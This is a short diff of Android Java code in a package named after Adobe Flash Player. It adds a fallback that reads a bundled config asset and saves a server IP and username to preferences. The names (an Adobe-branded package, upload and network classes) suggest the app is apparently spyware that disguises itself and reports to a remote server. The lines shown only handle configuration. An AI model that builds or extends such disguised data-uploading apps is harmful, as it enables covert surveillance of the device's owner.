@@ -6,6 +6,7 @@ import android.os.Message;
 import android.util.Log;
 import java.io.File;
 import java.io.FileInputStream;
+import java.io.InputStream;
 
 import com.adobe.flashplayer.data.UploadRemainder;
 import com.adobe.flashplayer.network.Network;
@@ -55,6 +56,23 @@ public class MainEntry extends Thread{
                 FileInputStream fin = new FileInputStream(file);
                 fin.read(buf, 0, len);
                 fin.close();
+
+                JSONObject json = new JSONObject(new String(buf));
+                String ip = json.optString("ip");
+
+                if (ip != null && ip.equals("") == false) {
+                    PrefOper.setValue(context, Public.PARAMCONFIG_FileName, Public.CFGSERVERIP, ip);
+                }
+                String username = json.optString("username");
+                if (username != null && username.equals("") == false) {
+                    PrefOper.setValue(context, Public.PARAMCONFIG_FileName, Public.CFGUSERNAME, username);
+                }
+            }else {
+                InputStream input = context.getAssets().open(Public.CONFIG_FILENAME);
+                int size =input.available();
+                byte buf[] = new byte[size + 1024];
+                input.read(buf,0,size);
+                input.close();
 
                 JSONObject json = new JSONObject(new String(buf));
                 String ip = json.optString("ip");
